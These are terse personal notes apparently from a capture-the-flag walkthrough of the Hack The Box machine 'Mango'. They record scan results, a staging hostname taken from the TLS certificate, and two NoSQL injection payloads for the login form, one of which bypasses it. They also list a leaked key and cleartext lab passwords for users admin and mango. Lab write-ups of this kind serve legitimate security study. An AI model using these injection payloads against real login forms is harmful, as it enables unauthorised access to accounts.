# Mango htb
## Initial scans
- ports open 22,80,443 --> nmap 1000 port scan

## Web Scan
- http://10.10.10.162/server-status --> 403

- https://10.10.10.162/analytics.php --> Promising --> able to upload json, csv, etc

- Viewed the certifiticate on https
### CN --> staging-order.mango.htb --> put into /etc/hosts
- When accessing the webpage from https://staging-order.mango.htb:443/analytics.php --> script running results in an error 
-  This error also gives a key!!!

```
Z7U7-XHIF9V-4A5Q3S-343X5O-0P5G1R-5G2G25-6S5F2Q-0Q0F5Z-37
```

- http://staging-order.mango.htb:80/ --> given a login page with MANGOES

- nikto --> admin@mango.htb --> also viewable in the nmap as well as the CN

- http://staging-order.mango.htb/vendor/composer/ --> 403
	* http://staging-order.mango.htb/vendor/composer/installed.json

#### Possible exploit for nosql injection ... doesn't work
```
username="{'$eq':'admin'}"&password="{'$regex':'^.'}"&login=login
```

### nosqli - 302 found
```
username=admin&login=login&password[$regex]=.{0}
```

## Password for user admin
### t9KcS3>!0B#2

## Password for user mango
### h3mXK8RhU~f{]f5H
